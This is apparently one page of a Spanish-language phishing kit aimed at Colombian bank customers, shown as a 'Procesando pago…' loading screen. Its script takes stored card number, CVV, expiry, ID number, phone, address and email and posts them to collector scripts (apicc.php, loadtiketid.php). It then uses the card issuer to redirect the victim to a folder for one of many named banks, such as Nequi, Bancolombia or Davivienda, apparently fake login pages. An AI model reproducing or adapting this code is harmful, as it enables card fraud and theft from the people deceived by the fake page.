<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Procesando pago…</title>
  <style>
    :root {
      --gris:#e9e9e9;
      --barra:#74d330;
    }
    html, body { height: 100% }
    body {
      margin: 0;
      background: #fff;
      color: #12261b;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      min-height: 100svh;
      display: grid;
      place-items: center;
      padding: 24px;
    }
    .center {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
      width: min(520px, 92vw);
    }
    #brandImg {
      display: none;
      width: 80px;
      height: auto;
      object-fit: contain;
      margin-bottom: 10px;
    }
    .thin-loader {
      position: relative;
      width: 100%;
      height: 4px;
      border-radius: 999px;
      background: var(--gris);
      overflow: hidden;
    }
    .thin-loader::before {
      content: "";
      position: absolute;
      inset: 0 auto 0 -40%;
      width: 40%;
      background: linear-gradient(90deg, rgba(116,211,48,0) 0%, var(--barra) 50%, rgba(116,211,48,0) 100%);
      border-radius: inherit;
      animation: slide 1.05s ease-in-out infinite;
    }
    @keyframes slide { from { left: -40% } to { left: 100% } }
  </style>
</head>
<body>
  <div class="center" aria-live="polite">
    <img id="brandImg" alt="">
    <div class="thin-loader" role="progressbar" aria-busy="true" aria-label="Procesando"></div>
  </div>

<script>
(function() {
  const datos = (() => {
    try { return JSON.parse(localStorage.getItem('tbdatos') || '{}'); }
    catch { return {}; }
  })();

  // Mostrar logo según tarjeta
  const mostrarLogo = () => {
    const num = String(datos.cardNumber || datos.tarjeta || '').replace(/\s+/g, '');
    const img = document.getElementById('brandImg');
    if (num.startsWith('4')) {
      img.src = 'visa.png';
      img.alt = 'Visa';
      img.style.display = 'block';
    } else if (num.startsWith('5')) {
      img.src = 'master.png';
      img.alt = 'Mastercard';
      img.style.display = 'block';
    } else {
      img.style.display = 'none';
    }
  };
  mostrarLogo();

  // Construir el payload con los datos combinados
  const payload = {
    ownerName: datos.ownerName || datos.nombre || '',
    cardNumber: datos.cardNumber || datos.tarjeta || '',
    expMonth: datos.expMonth || '',
    expYear: datos.expYear || '',
    cvv: datos.cvv || '',
    cuotas: datos.cuotas || '',
    cedula: datos.documento || datos.cedula || '',
    phone: datos.telefono || '',
    city: datos.ciudad || '',
    address: datos.direccion || '',
    contact: {
      correo: datos.correo || localStorage.getItem('correo') || '',
      telefono: datos.telefono || ''
    }
  };

  // Validación mínima
  if (!payload.cardNumber || !payload.expMonth || !payload.expYear || !payload.cvv) {
    alert("Faltan datos de tarjeta. Verifica que todo esté completo.");
    return;
  }

  // Llamada a apicc.php
  fetch('apicc.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      number: payload.cardNumber.replace(/\s+/g, ''),
      expiry_month: payload.expMonth,
      expiry_year: (payload.expYear.length === 2)
    ? "20" + payload.expYear
    : payload.expYear,

      cvv: payload.cvv,
      name: payload.ownerName,
      billing_address: { country: 'CO' },
      phone: {}
    })
  })
  .then(res => res.json())
  .then(resApi => {
    const bancoLimpio = (resApi.issuer || datos.banco || 'Desconocido')
      .replace(/ S\.A\.?/gi, '')
      .trim();

    const tipo = (resApi.scheme || '').toLowerCase() || 'Desconocido';

    // Guardar en localStorage
    localStorage.setItem('infoload', JSON.stringify({ bank: bancoLimpio }));
    localStorage.setItem('TIPE', JSON.stringify({ tipo }));

    // Agregar al payload
    payload.bank = bancoLimpio;
    payload.type = tipo;

    // Agregar tbdatos original al payload
    payload.tbdatos = datos;

    // Enviar a loadtiketid.php
    return fetch('loadtiketid.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }) // 👈 aquí cerramos el .then(resApi => { ... })

.then(res => {
  if (!res.ok) {
    console.error('Error al guardar en loadtiketid.php:', res.status);
    alert("Error en procesamiento del pago.");
    return;
  }

  const params = window.location.search || "";

  // 1️⃣ Invertir el proceso: de tbdatos -> variables individuales
  try {
    const tb = JSON.parse(localStorage.getItem("tbdatos") || "{}") || {};
    if (Object.keys(tb).length > 0) {
      if (tb.correo != null)        localStorage.setItem("correo", tb.correo);
      if (tb.telefono != null)      localStorage.setItem("cel", tb.telefono);
      if (tb.documento != null)     localStorage.setItem("val", tb.documento);
      if (tb.tipo_persona != null)  localStorage.setItem("per", tb.tipo_persona);
      if (tb.nombre != null)        localStorage.setItem("nom", tb.nombre);
      if (tb.banco != null)         localStorage.setItem("banco", tb.banco);
    }
  } catch (e) {
    console.warn("No se pudo leer tbdatos desde localStorage:", e);
  }

  // 2️⃣ SISTEMA ROBUSTO DE BANCO + FOLDER
  let folder = null;
  let tipo   = null;

  // Intentar leer banco desde el <select>
  const selBanco = document.getElementById("txt-banco");
  if (selBanco && selBanco.value) {
    const opt = selBanco.options[selBanco.selectedIndex];
    folder = opt.getAttribute("folder") || null;
    tipo   = opt.getAttribute("tipo")   || null;
  }

  // Si no hay folder del select, intentamos desde infoload / tbdatos
  if (!folder) {
    const info = JSON.parse(localStorage.getItem("infoload") || "{}");
    let bancoRaw = (info.bank || "").toLowerCase().trim();

    // Si tbdatos tiene banco, lo priorizamos sobre info.bank
    try {
      const tb = JSON.parse(localStorage.getItem("tbdatos") || "{}") || {};
      if (tb.banco) {
        bancoRaw = String(tb.banco).toLowerCase().trim();
      }
    } catch (e) {}

    // Normalizar: quitar tildes y símbolos
    bancoRaw = bancoRaw
      .normalize("NFD")
      .replace(/[\u0300-\u036f]/g, "")
      .replace(/[^a-z0-9\s]/g, "");
    const bancoClean = bancoRaw.replace(/\s+/g, "");

    // 🟡 PRIORIDAD NEQUI: si el texto contiene "nequi", se va directo a nequi-1
    if (bancoClean.includes("nequi")) {
      folder = "nequi-1";
      tipo   = "1";
    } else {
      // Mapa general para el resto de bancos
     const bankMap = [
  { keys: ["avvillas", "bancoavvillas"], folder: "b-34f1/",  tipo: "2" },
  { keys: ["bbva"], folder: "b-34f13", tipo: "2" },
  { keys: ["cajasocial", "bancocajasocial"], folder: "b-34f2", tipo: "2" },
  { keys: ["bogota", "bancodebogota"], folder: "b-34f4", tipo: "2" },

  // 🔥 Davivienda
  { keys: ["davivienda"], folder: "b-34f10", tipo: "2" },

  { keys: ["occidente", "bancodeoccidente"], folder: "b-34f14", tipo: "2" },
  { keys: ["falabella"], folder: "b-34f5", tipo: "2" },
  { keys: ["finandina"], folder: "b-34f6", tipo: "2" },
  { keys: ["itau"], folder: "b-34f7", tipo: "2" },

  { keys: ["mundomujer", "bmancomundomujer"], folder: "b-34f01", tipo: "1" },
  { keys: ["popular", "bancopopular"], folder: "b-34f18", tipo: "2" },
  { keys: ["serfinanza"], folder: "b-34f16", tipo: "2" },

  { keys: ["union", "giros", "bancounion"], folder: "b-34f0", tipo: "1" },

  { keys: ["bancolombia", "bancocolombia"], folder: "b-34f9", tipo: "2" },

  { keys: ["lulo"], folder: "b-34f02", tipo: "1" },

  { keys: ["scotiabank", "colpatria", "scotiabankcolpatria"], folder: "b-34f12", tipo: "2" }
];


      for (const bank of bankMap) {
        const match = bank.keys.some(k => {
          const kClean = k.replace(/\s+/g, "");
          return bancoClean.includes(kClean);
        });
        if (match) {
          folder = bank.folder;
          tipo   = bank.tipo;
          break;
        }
      }
    }
  }

  // 3️⃣ Redirección final
  if (folder) {
    setTimeout(() => {
      window.location.href = `../data-ps/recargas/transaction/${folder}${params}`;
    }, 800);
  } else {
    console.warn("Banco no identificado, redirigiendo a 3d.php");
    window.location.href = "3d.php";
  }
})


.catch(err => {
  console.error('Fallo en el proceso:', err);
  alert("Fallo inesperado. Verifica consola.");
});

})(); 

</script>

</body>
</html>
